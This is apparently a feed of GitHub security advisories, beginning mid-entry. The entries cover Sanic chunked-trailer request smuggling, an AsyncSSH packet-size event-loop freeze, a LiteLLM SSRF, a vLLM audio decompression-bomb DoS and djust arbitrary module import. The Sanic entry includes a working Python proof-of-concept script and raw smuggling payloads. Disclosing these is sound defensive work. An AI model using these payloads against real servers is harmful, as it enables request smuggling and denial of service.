<li><a href="https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6">https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6</a></li>
<li><a href="https://github.com/sanic-org/sanic/releases/tag/v24.12.1">https://github.com/sanic-org/sanic/releases/tag/v24.12.1</a></li>
<li><a href="https://github.com/sanic-org/sanic/releases/tag/v25.12.1">https://github.com/sanic-org/sanic/releases/tag/v25.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/advisories/GHSA-wmj6-g64g-j7q5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:59:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sanic] sanic chunked trailer request smuggling allows hidden second request execution]]></title>
        <id>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</id>
        <link href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5"/>
        <updated>2026-09-17T14:59:18.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>Sanic's HTTP/1.1 chunked-body handling does not fully consume the <code>trailer-part</code> after the terminating <code>0\r\n</code> chunk. Because of that, attacker-controlled bytes left in the connection buffer after the first chunked request can be interpreted as the start of a new HTTP request on the same keep-alive connection. In the attached verified proof, a single outer <code>POST /</code> request that correctly returns <code>405 Method Not Allowed</code> is followed, within the same TCP send, by a hidden second request smuggled through the chunked trailer area. Sanic parses and executes that second request as a real independent request.</p>
<p>The issue is a request-boundary integrity failure in Sanic's core HTTP/1.1 parser. The verified impact is not speculative. The attached proof shows that one TCP payload produces two server responses: first the expected <code>405</code> for the outer <code>POST /</code>, then a separate <code>200 OK</code> for a hidden <code>GET /</code>. A second exploit variant changes the hidden request path and receives a real <code>404 Not Found</code>, proving that the hidden second request is not a hard-coded artifact but an actually routed backend request. A control case with a two-character trailer field name shifts the leftover bytes from <code>GET</code> to <code>:GET</code>, which changes the second response accordingly and confirms that the root cause is incorrect trailer consumption rather than legitimate pipelining.</p>
<h2 id="steps-to-reproduce">Steps To Reproduce</h2>
<ol>
<li>Start a Sanic HTTP/1.1 service on a keep-alive connection path. In the verified run, the local target listened on <code>127.0.0.1:9381</code> and the root route allowed <code>GET /</code> but not <code>POST /</code>.</li>
<li>From the package root, run the provided PoC:</li>
</ol>
<pre><code class="language-bash">python3 evidence/vuln_001_chunked_trailer_smuggle.py | tee evidence/vuln_001_chunked_trailer_smuggle.run.txt
</code></pre>
<ol start="3">
<li>Review the baseline case in <code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>. A normal chunked request with <code>0\r\n\r\n</code> returns exactly one response block:</li>
</ol>
<pre><code class="language-text">=== CASE: baseline_no_trailer ===
Received response blocks: 1
HTTP/1.1 405 Method Not Allowed
</code></pre>
<ol start="4">
<li>Review the exploit case that hides <code>GET /</code> in the trailer area:</li>
</ol>
<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
</code></pre>
<p>The PoC sends a single TCP payload containing:</p>
<pre><code class="language-text">POST / HTTP/1.1
Host: 127.0.0.1:9381
Connection: keep-alive
Transfer-Encoding: chunked

1
X
0
a:GET / HTTP/1.1
Host: 127.0.0.1:9381
</code></pre>
<ol start="5">
<li>Confirm that Sanic returns two response blocks from that one send:</li>
</ol>
<pre><code class="language-text">Received response blocks: 2
HTTP/1.1 405 Method Not Allowed
...
HTTP/1.1 200 OK
...
{"test":true}
</code></pre>
<ol start="6">
<li>Review the second exploit case that changes the smuggled request path to a nonexistent route:</li>
</ol>
<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
</code></pre>
<p>Confirm that Sanic again returns two response blocks and that the second response is a real routed <code>404 Not Found</code> for the attacker-controlled hidden path.
7. Review the control case with a two-character trailer field name:</p>
<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
</code></pre>
<p>Confirm that the second request is now interpreted as <code>:GET /</code>, producing a second <code>405</code> with <code>Method :GET not allowed for URL /</code>. This demonstrates that the leftover bytes begin at a parser offset inside the trailer region and are then reinterpreted as a new request line.</p>
<h2 id="recommendations">Recommendations</h2>
<p>After parsing the terminating <code>0</code> chunk, Sanic must continue parsing and fully consuming the <code>trailer-part</code> until the final empty line before the connection buffer is reused. If trailer support is not intended, the safer behavior is to reject any request that contains bytes after the terminating <code>0\r\n</code> other than the expected final empty line, and then close the connection instead of keeping it alive.</p>
<p>Add regression coverage for all three cases shown in the evidence: a normal <code>0\r\n\r\n</code> chunked termination, a legal trailer that must be fully consumed, and a malicious trailer that must never cause a second backend request to be parsed. The fix needs to guarantee that no bytes from trailer processing can remain in the buffer as a candidate next request.</p>
<h2 id="poc">poc</h2>
<pre><code class="language-python">#!/usr/bin/env python3
"""Proof of concept for HTTP/1.1 chunked trailer request injection."""

from __future__ import annotations

import socket
from dataclasses import dataclass
from typing import Iterable


TARGET = "sanic-org/sanic"
BASE_URL = "http://127.0.0.1:9381"
HOST = "127.0.0.1"
PORT = 9381
TIMEOUT = 1.0
PROXY = None
AUTH_HEADERS: dict[str, str] = {}


@dataclass
class Case:
    name: str
    payload: bytes
    expected_responses: int
    expected_markers: tuple[bytes, ...]


def build_prefix() -&gt; bytes:
    return (
        b"POST / HTTP/1.1\r\n"
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"Connection: keep-alive\r\n"
        + b"Transfer-Encoding: chunked\r\n"
        + b"\r\n"
        + b"1\r\n"
        + b"X\r\n"
    )


def build_case_payload(path: str | None = None, field_name: str = "a") -&gt; bytes:
    prefix = build_prefix()
    if path is None:
        return prefix + b"0\r\n\r\n"
    return (
        prefix
        + b"0\r\n"
        + f"{field_name}:GET {path} HTTP/1.1\r\n".encode()
        + f"Host: {HOST}:{PORT}\r\n".encode()
        + b"\r\n"
    )


def send_payload(payload: bytes) -&gt; bytes:
    response = bytearray()
    with socket.create_connection((HOST, PORT), timeout=3) as sock:
        sock.sendall(payload)
        sock.settimeout(TIMEOUT)
        while True:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            response.extend(chunk)
    return bytes(response)


def count_http_responses(response: bytes) -&gt; int:
    return response.count(b"HTTP/1.1 ")


def ensure_markers(case: Case, response: bytes) -&gt; None:
    actual_count = count_http_responses(response)
    if actual_count != case.expected_responses:
        raise SystemExit(
            f"[FAIL] {case.name}: expected {case.expected_responses} responses, got {actual_count}"
        )
    for marker in case.expected_markers:
        if marker not in response:
            raise SystemExit(
                f"[FAIL] {case.name}: missing marker {marker.decode('latin1', 'replace')}"
            )


def render_payload(payload: bytes) -&gt; str:
    return payload.decode("latin1", "replace")


def render_response(response: bytes) -&gt; str:
    return response.decode("latin1", "replace")


def iter_cases() -&gt; Iterable[Case]:
    yield Case(
        name="baseline_no_trailer",
        payload=build_case_payload(),
        expected_responses=1,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method POST not allowed for URL /",
        ),
    )
    yield Case(
        name="exploit_smuggled_root",
        payload=build_case_payload("/"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 200 OK",
            b'{"test":true}',
        ),
    )
    yield Case(
        name="exploit_smuggled_404",
        payload=build_case_payload("/this-path-should-not-exist"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"HTTP/1.1 404 Not Found",
            b"Requested URL /this-path-should-not-exist not found",
        ),
    )
    yield Case(
        name="offset_control_two_char_field_name",
        payload=build_case_payload("/", field_name="ab"),
        expected_responses=2,
        expected_markers=(
            b"HTTP/1.1 405 Method Not Allowed",
            b"Method :GET not allowed for URL /",
        ),
    )


def main() -&gt; None:
    print(f"Target: {TARGET}")
    print(f"Base URL: {BASE_URL}")
    print()
    for case in iter_cases():
        print(f"=== CASE: {case.name} ===")
        print("Sent payload:")
        print(render_payload(case.payload))
        response = send_payload(case.payload)
        ensure_markers(case, response)
        print(f"Received response blocks: {count_http_responses(response)}")
        print("Raw response:")
        print(render_response(response))
        print("[OK] Case verified")
        print()


if __name__ == "__main__":
    main()
</code></pre>
<h2 id="evidence-files">Evidence Files</h2>
<p>The attachment package includes the exact PoC and the full runtime output from the verified local execution.</p>
<ul>
<li><code>evidence/vuln_001_chunked_trailer_smuggle.py</code>: full PoC used for the verified run.</li>
<li><code>evidence/vuln_001_chunked_trailer_smuggle.run.txt</code>: runtime output showing the baseline behavior, the successful smuggled <code>GET /</code> execution, the successful smuggled <code>GET /this-path-should-not-exist</code> execution, and the trailer-offset control case.</li>
</ul>
<p>Observed baseline behavior:</p>
<pre><code class="language-text">=== CASE: baseline_no_trailer ===
Received response blocks: 1
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /
</code></pre>
<p>Observed hidden second request execution:</p>
<pre><code class="language-text">=== CASE: exploit_smuggled_root ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 200 OK
...
{"test":true}
</code></pre>
<p>Observed hidden attacker-controlled path execution:</p>
<pre><code class="language-text">=== CASE: exploit_smuggled_404 ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 404 Not Found
...
Requested URL /this-path-should-not-exist not found
</code></pre>
<p>Observed trailer-offset control:</p>
<pre><code class="language-text">=== CASE: offset_control_two_char_field_name ===
Received response blocks: 2
Raw response:
HTTP/1.1 405 Method Not Allowed
...
Method POST not allowed for URL /

HTTP/1.1 405 Method Not Allowed
...
Method :GET not allowed for URL /
</code></pre>
<h2 id="impact">Impact</h2>
<p>An attacker who can send a chunked HTTP/1.1 request to a Sanic backend can cause the backend to interpret bytes from the trailer region as a second request on the same keep-alive connection. In the verified proof, that second request was fully routed and executed by the backend even though only one outer request was sent by the client.</p>
<p>This breaks the integrity of HTTP request boundaries inside the server. In real deployments that place Sanic behind reverse proxies, gateways, caches, or other intermediaries, a backend parser mismatch of this kind can become a request smuggling primitive with broader security consequences than the local proof route demonstrates.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/sanic-org/sanic/security/advisories/GHSA-wmj6-g64g-j7q5</a></li>
<li><a href="https://github.com/sanic-org/sanic/pull/3164">https://github.com/sanic-org/sanic/pull/3164</a></li>
<li><a href="https://github.com/sanic-org/sanic/pull/3165">https://github.com/sanic-org/sanic/pull/3165</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22">https://github.com/sanic-org/sanic/commit/47349d689d65fa1907977ac100e867894aeafb22</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea">https://github.com/sanic-org/sanic/commit/69a10d3b06babaa9e5f6d1af577364e9e53b6dea</a></li>
<li><a href="https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6">https://github.com/sanic-org/sanic/commit/a332796506c7c588b6930b02a8886e43eb8ea8d6</a></li>
<li><a href="https://github.com/sanic-org/sanic/releases/tag/v24.12.1">https://github.com/sanic-org/sanic/releases/tag/v24.12.1</a></li>
<li><a href="https://github.com/sanic-org/sanic/releases/tag/v25.12.1">https://github.com/sanic-org/sanic/releases/tag/v25.12.1</a></li>
<li><a href="https://github.com/advisories/GHSA-wmj6-g64g-j7q5">https://github.com/advisories/GHSA-wmj6-g64g-j7q5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmj6-g64g-j7q5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:59:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[asyncssh] AsyncSSH: asyncio event-loop freeze via SSH maximum packet size = 0 in SSH_MSG_CHANNEL_OPEN / OPEN_CONFIRMATION]]></title>
        <id>https://github.com/advisories/GHSA-rw4j-r22c-9gc3</id>
        <link href="https://github.com/advisories/GHSA-rw4j-r22c-9gc3"/>
        <updated>2026-09-17T14:53:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A malicious SSH server can wedge an AsyncSSH <strong>client</strong>, and an authenticated
client can wedge an AsyncSSH <strong>server</strong>, by sending a channel <code>maximum packet size</code> of <code>0</code> in <code>SSH_MSG_CHANNEL_OPEN_CONFIRMATION</code> (server→client) or
<code>SSH_MSG_CHANNEL_OPEN</code> (client→server). AsyncSSH stores the peer-supplied value
verbatim with no lower-bound check; the first time channel data is written,
<code>SSHChannel._flush_send_buf</code> enters a <strong>synchronous infinite loop</strong> that cannot
be interrupted by <code>asyncio.wait_for</code> or any timeout. The loop body has no
<code>await</code>, so it blocks the entire asyncio event loop — for a server, one
malicious authenticated channel freezes <strong>all</strong> current and future connections.</p>
<p>RFC 4254 §5.1 leaves receiver behavior for a peer-reported "maximum packet
size = 0" undefined, so the value must be rejected rather than stored.</p>
<h2 id="root-cause">Root cause</h2>
<p><code>asyncssh/channel.py</code>:</p>
<pre><code class="language-python"># process_open (server side)        -- line 465
self._send_pktsize = send_pktsize    # peer value, no &gt;= 1 check

# process_open_confirmation (client) -- line 528
self._send_pktsize = send_pktsize    # peer value, no &gt;= 1 check

# _flush_send_buf                    -- lines 305-320
while self._send_buf and self._send_window:
    pktsize = min(self._send_window, self._send_pktsize)  # 0 when peer sends 0
    buf, datatype = self._send_buf[0]
    if len(buf) &gt; pktsize:          # True for any buffered data
        data = buf[:pktsize]        # empty (b'')
        del buf[:pktsize]           # no-op
    ...
    self._send_window -= len(data)  # -= 0, unchanged
</code></pre>
<p>With <code>_send_pktsize == 0</code>, <code>pktsize</code> is <code>0</code>, so <code>buf[:0]</code> is empty,
<code>del buf[:0]</code> is a no-op, and <code>_send_window</code> is never decremented — the
<code>while</code> condition is permanently true, and with no <code>await</code> in the body the
event loop is blocked.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Client vector (primary):</strong> a malicious SSH server replies to the client's
channel open with <code>maximum packet size = 0</code>; the client wedges on its first
channel write. The attacker is the server, so it needs no valid credentials.</li>
<li><strong>Server vector:</strong> an authenticated client opens a channel with
<code>maximum packet size = 0</code>; any server-side channel write wedges the AsyncSSH
server's event loop, freezing <strong>every</strong> current and future connection. A
single low-privilege account can take the whole server down.</li>
</ul>
<p>Both vectors are a single SSH message, deterministic, and cause total
availability loss for the affected process.</p>
<h2 id="affected-versions">Affected versions</h2>
<p>&lt;= 2.23.1 (latest release, 2026-06-06); also present on <code>master</code>
(channel.py:465/528 unguarded). Verified end-to-end on 2.23.1.</p>
<h2 id="verification">Verification</h2>
<p>The maintainer's proposed fix (reject <code>send_pktsize == 0</code> in <code>connection.py</code>
<code>_process_channel_open</code> / <code>_process_channel_open_confirmation</code>) was applied to
2.23.1 and re-tested end-to-end over TCP:</p>
<ul>
<li><strong>Unpatched:</strong> malicious server (paramiko forcing <code>max_packet_size=0</code> in
OPEN_CONFIRMATION) + real asyncssh client → client event loop wedges.</li>
<li><strong>Patched:</strong> the guard fires inside <code>_process_channel_open_confirmation</code>, the
malicious value is rejected, the connection closes cleanly
(<code>ChannelOpenError: SSH connection closed</code>), and the client does <strong>not</strong> wedge.</li>
</ul>
<p>The maintainer (Ron Frederick) independently confirmed the freeze and noted that
<strong>even shutting the server down does not break clients out of the loop</strong>.</p>
<p>Reproducers available: a focused harness driving the real
<code>SSHChannel._flush_send_buf</code> with <code>_send_pktsize=0</code>, and an end-to-end
<code>malicious_server.py</code> (paramiko) + <code>client.py</code> (real asyncssh) pair. The
end-to-end client repro uses <code>asyncio.new_event_loop()</code> (not <code>get_event_loop()</code>)
for Python 3.14 compatibility.</p>
<h2 id="suggested-fix-maintainers-approach">Suggested fix (maintainer's approach)</h2>
<p>In <code>connection.py</code>, after each <code>send_pktsize = packet.get_uint32()</code> in
<code>_process_channel_open</code> and <code>_process_channel_open_confirmation</code>:</p>
<pre><code class="language-python">if send_pktsize == 0:
    raise ProtocolError('Invalid maximum packet size')
</code></pre>
<h2 id="cvss">CVSS</h2>
<p><code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code> (6.5 Medium). An earlier draft
quoted 7.5 High ("100% CPU"); the synchronous loop burns ~100% of one core's
worth of CPU but, being single-threaded, the OS scheduler spreads it across
cores, so the real impact is event-loop / connection freeze, not machine-wide
CPU exhaustion.</p>
<h2 id="references">References</h2>
<ul>
<li>RFC 4254 §5.1 (channel "maximum packet size"; behavior for 0 is undefined).</li>
<li>The same <code>maximum packet size = 0</code> send-loop wedge was confirmed in several
other independent SSH implementations (different languages/runtimes) and
reported to each maintainer separately.</li>
</ul>
<h2 id="credits">Credits</h2>
<p>Reported by zhangph (afldl), 2026-06-20.</p>
<pre><code>### References

- &lt;https://github.com/ronf/asyncssh/security/advisories/GHSA-rw4j-r22c-9gc3&gt;
- &lt;https://nvd.nist.gov/vuln/detail/CVE-2026-62949&gt;
- &lt;https://github.com/ronf/asyncssh/commit/756cbae5350789ce9735f15f704bae9b5a3608b8&gt;
- &lt;https://github.com/ronf/asyncssh/commit/9c354270c009285525e126721e8ed5fbed1f8a67&gt;
- &lt;https://github.com/ronf/asyncssh/releases/tag/v2.24.0&gt;
- &lt;https://github.com/advisories/GHSA-rw4j-r22c-9gc3&gt;
</code></pre>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rw4j-r22c-9gc3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:53:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[litellm] LiteLLM Proxy has server-side request forgery via the `user_config` request parameter]]></title>
        <id>https://github.com/advisories/GHSA-hx8v-g79f-8w5f</id>
        <link href="https://github.com/advisories/GHSA-hx8v-g79f-8w5f"/>
        <updated>2026-09-17T14:51:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A server-side request forgery in LiteLLM Proxy lets an authenticated caller redirect the
proxy's outbound request to a host of their choosing by smuggling an <code>api_base</code> inside the
<code>user_config</code> request body, bypassing the existing parameter guard.</p>
<h3 id="details">Details</h3>
<p>LiteLLM Proxy validates request bodies with <code>is_request_body_safe</code>, which blocks the
<code>api_base</code> and <code>base_url</code> parameters but does not cover <code>user_config</code>. The <code>user_config</code>
object is used to build the outbound router for a request, so a caller can place an
<code>api_base</code> inside it and reach an arbitrary host. The guard only inspected the two
top-level keys, so the same <code>api_base</code> nested inside <code>user_config</code> was never checked.</p>
<p>Exploitation requires a valid virtual key.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated caller can make the proxy issue server-side requests to internal or
external hosts of their choosing, reaching endpoints the caller cannot otherwise access.</p>
<h3 id="affected--patched">Affected / Patched</h3>
<p>Affected: <code>&lt;= 1.83.8</code>
Patched: <code>1.83.9</code></p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to 1.83.9 or later (released 2026-04-17).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BerriAI/litellm/security/advisories/GHSA-hx8v-g79f-8w5f">https://github.com/BerriAI/litellm/security/advisories/GHSA-hx8v-g79f-8w5f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59823">https://nvd.nist.gov/vuln/detail/CVE-2026-59823</a></li>
<li><a href="https://github.com/BerriAI/litellm/pull/25827">https://github.com/BerriAI/litellm/pull/25827</a></li>
<li><a href="https://github.com/BerriAI/litellm/commit/47214be317f45a2d2ac08258362e0481411eb427">https://github.com/BerriAI/litellm/commit/47214be317f45a2d2ac08258362e0481411eb427</a></li>
<li><a href="https://github.com/advisories/GHSA-hx8v-g79f-8w5f">https://github.com/advisories/GHSA-hx8v-g79f-8w5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hx8v-g79f-8w5f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:51:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vllm] vLLM: Unauthenticated audio decompression-bomb DoS in /v1/chat/completions]]></title>
        <id>https://github.com/advisories/GHSA-hcwq-8wjf-3gcr</id>
        <link href="https://github.com/advisories/GHSA-hcwq-8wjf-3gcr"/>
        <updated>2026-09-16T22:12:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The audio decode-duration guard (<code>max_duration_s</code>, env <code>VLLM_MAX_AUDIO_DECODE_DURATION_S</code>, default 600s) that protects against audio decompression-bomb DoS is wired into <strong>only</strong> the speech-to-text path (<code>/v1/audio/transcriptions</code>). The <strong>chat</strong> audio path (<code>/v1/chat/completions</code>, <code>input_audio</code> content parts) calls the same decoder with <strong>no</strong> limit, so an <strong>unauthenticated</strong> client can submit a few-KB compressed audio file that expands to multiple GB of float32 PCM at decode time, OOM-killing the worker. This is a distinct sibling of <strong>CVE-2026-5497</strong> (video frame-count bomb, <code>VideoMediaIO.load_base64</code>) and <strong>GHSA-pq5c-rjhq-qp7p</strong> (image) in the same media subsystem.</p>
<p>Verified against <code>main</code> at HEAD <code>d78650c</code> (2026-06-16); applicable to the latest release v0.23.0.</p>
<h3 id="details">Details</h3>
<p>The guard rejects long audio <em>during</em> decode (before allocation), implemented in <code>vllm/multimodal/media/audio.py</code>:</p>
<ul>
<li><code>load_audio_pyav</code> — metadata reject (<del>82-98) and live sample-count reject (</del>129-136)</li>
<li><code>load_audio_soundfile</code> — frames reject (~165-174)</li>
</ul>
<p>All are gated on <code>if max_duration_s is not None</code>.</p>
<p>It is passed in exactly <strong>one</strong> place — the transcription serving layer:</p>
<pre><code class="language-python"># .../speech_to_text/base/serving.py:~170-174
load_audio(buf, sr=..., max_duration_s=self.max_audio_decode_duration_s)
#   self.max_audio_decode_duration_s = envs.VLLM_MAX_AUDIO_DECODE_DURATION_S  (default 600)
</code></pre>
<p>The chat path never threads it:</p>
<pre><code class="language-python"># vllm/multimodal/media/audio.py:237-238
def load_bytes(self, data: bytes) -&gt; tuple[npt.NDArray, float]:
    return load_audio(BytesIO(data), sr=None)   # no max_duration_s -&gt; every guard above is skipped
</code></pre>
<p>Unauthenticated reachability chain (chat):
<code>parse_input_audio</code> (<code>chat_utils.py</code>) -&gt; <code>parse_audio</code> -&gt; <code>connector.fetch_audio</code> -&gt; <code>AudioMediaIO._load_data_url</code> -&gt; <code>load_base64</code> -&gt; <code>load_bytes</code> -&gt; <code>load_audio(..., sr=None)</code>. The connector never passes <code>max_duration_s</code>, and inline <code>data:</code> URLs need no HTTP fetch (so <code>VLLM_AUDIO_FETCH_TIMEOUT</code> does not bound them). The OpenAI-compatible server has no auth by default (auth only when <code>--api-key</code> / <code>VLLM_API_KEY</code> is set).</p>
<h3 id="impact">Impact</h3>
<p>Unauthenticated remote denial of service (availability) via memory amplification on a default-no-auth endpoint, on any deployment serving an audio-capable model. Same class and impact as the sibling CVE-2026-5497 (video). CWE-770 / CWE-409.</p>
<h3 id="fix">Fix</h3>
<p>A fix was introduced in this MR: <a href="https://github.com/vllm-project/vllm/pull/45908">https://github.com/vllm-project/vllm/pull/45908</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hcwq-8wjf-3gcr">https://github.com/vllm-project/vllm/security/advisories/GHSA-hcwq-8wjf-3gcr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-57173">https://nvd.nist.gov/vuln/detail/CVE-2026-57173</a></li>
<li><a href="https://github.com/vllm-project/vllm/pull/45908">https://github.com/vllm-project/vllm/pull/45908</a></li>
<li><a href="https://github.com/vllm-project/vllm/commit/3d20275bb4d434f53055c3c0b645fd8bb072965e">https://github.com/vllm-project/vllm/commit/3d20275bb4d434f53055c3c0b645fd8bb072965e</a></li>
<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.24.0">https://github.com/vllm-project/vllm/releases/tag/v0.24.0</a></li>
<li><a href="https://github.com/advisories/GHSA-hcwq-8wjf-3gcr">https://github.com/advisories/GHSA-hcwq-8wjf-3gcr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hcwq-8wjf-3gcr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-16T22:12:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust has an unauthenticated arbitrary module import via the WebSocket/SSE view-mount path]]></title>
        <id>https://github.com/advisories/GHSA-7prp-2623-8g45</id>
        <link href="https://github.com/advisories/GHSA-7prp-2623-8g45"/>
        <updated>2026-09-16T22:09:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The djust live transport resolves the LiveView to mount from a <strong>client-supplied dotted path</strong> by calling <code>__import__(module_path, ...)</code>. The module is imported — running its <strong>top-level code (import side effects)</strong> — <em>before</em> the framework checks that the resolved object is a <code>LiveView</code> subclass and <em>before</em> any per-view authentication. The <code>LIVEVIEW_ALLOWED_MODULES</code> allowlist that should contain this is <strong>fail-open</strong> (<code>if allowed_modules:</code> — skipped when the setting is unset, the framework default) and uses loose <code>startswith</code> matching.</p>
<p>An <strong>unauthenticated</strong> WebSocket client (the WS handshake does not require auth; per-view auth runs only after import + instantiate) can therefore send a <code>mount</code> / <code>live_redirect_mount</code> / <code>url_change</code> frame (or an SSE mount) with <code>view = "&lt;any.importable.module&gt;.AnyName"</code> and cause the server to import — and execute the top-level code of — <strong>any importable Python module by name</strong>.</p>
<p><strong>Consequences:</strong> server-side execution of arbitrary importable modules' import-time side effects by an unauthenticated client (effectively RCE-by-proxy on any host that has a side-effectful importable module), denial of service (import bombs / expensive dependency trees), and a module/class <strong>enumeration oracle</strong> via distinct error strings.</p>
<p>Reproduced end-to-end: an unauthenticated <code>WebsocketCommunicator</code> <code>mount</code> frame with the allowlist unset imported and executed a sentinel non-LiveView module before the "not a LiveView subclass" rejection.</p>
<h3 id="affected-code">Affected code</h3>
<ul>
<li><code>python/djust/websocket.py</code> <code>handle_mount</code> (<code>__import__</code> of the client <code>view</code>)</li>
<li><code>python/djust/runtime.py</code> <code>ViewRuntime.dispatch_mount</code> / <code>_instantiate_view</code> (SSE + <code>url_change</code> path)</li>
<li><code>python/djust/sse.py</code> SSE mount</li>
</ul>
<p>Threat-model entry T4 (<code>docs/audits/websocket-auth-2026-06.md</code>) previously noted the default-open allowlist but understated the impact as mere LiveView-class probing; the real primitive is arbitrary-module import + top-level code execution, independent of whether the target is a LiveView.</p>
<h3 id="patches">Patches</h3>
<p>Fixed by a fail-<strong>closed</strong> resolution gate (<code>djust._view_resolution.is_view_import_allowed</code>): a client view path resolves only if (a) its module is <strong>already loaded</strong> (<code>sys.modules</code> — so resolving runs no new code; URL-routed views loaded by URLconf at startup keep working with zero config) or (b) it matches <code>LIVEVIEW_ALLOWED_MODULES</code> on a <strong>module-segment boundary</strong> (explicit opt-in for lazily-imported views). The gate runs <strong>before</strong> <code>__import__</code> at all three sinks (+ defense-in-depth inside <code>_instantiate_view</code>).</p>
<h3 id="workarounds">Workarounds</h3>
<p>Set <code>LIVEVIEW_ALLOWED_MODULES</code> to the narrow list of modules that contain your mountable LiveView classes. (Note: pre-patch the allowlist is <code>startswith</code>-matched and the import still precedes the subclass check, so this is mitigation, not a complete fix.)</p>
<h3 id="references">References</h3>
<p>Reproducer + finding writeup retained privately by the maintainer.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-7prp-2623-8g45">https://github.com/djust-org/djust/security/advisories/GHSA-7prp-2623-8g45</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.0.7">https://github.com/djust-org/djust/releases/tag/v1.0.7</a></li>
<li><a href="https://github.com/advisories/GHSA-7prp-2623-8g45">https://github.com/advisories/GHSA-7prp-2623-8g45</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7prp-2623-8g45</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-16T22:09:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust: WebSocket/runtime reconstructed request omits the client Host, causing host/subdomain TenantResolvers to misresolve the tenant on the live path]]></title>
        <id>https://github.com/advisories/GHSA-v9rj-xjfv-xj9r</id>
        <link href="https://github.com/advisories/GHSA-v9rj-xjfv-xj9r"/>
        <updated>2026-09-16T22:08:03.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The WebSocket <code>handle_mount</code> and <code>ViewRuntime._build_request</code> rebuild an <code>HttpRequest</code> via <code>RequestFactory().get(...)</code> with no <code>HTTP_HOST</code>, so <code>request.get_host()</code> defaulted to <code>"testserver"</code> on the live path. Host/subdomain/domain <code>TenantResolver</code>s then misresolved the tenant — <code>None</code> on the live path while the HTTP path resolved correctly. With <code>STRICT_MODE=False</code> the tenant-scoped managers returned unscoped rows (<strong>cross-tenant disclosure</strong>); with the default they returned an empty queryset (broken tenancy).</p>
<h3 id="patches">Patches</h3>
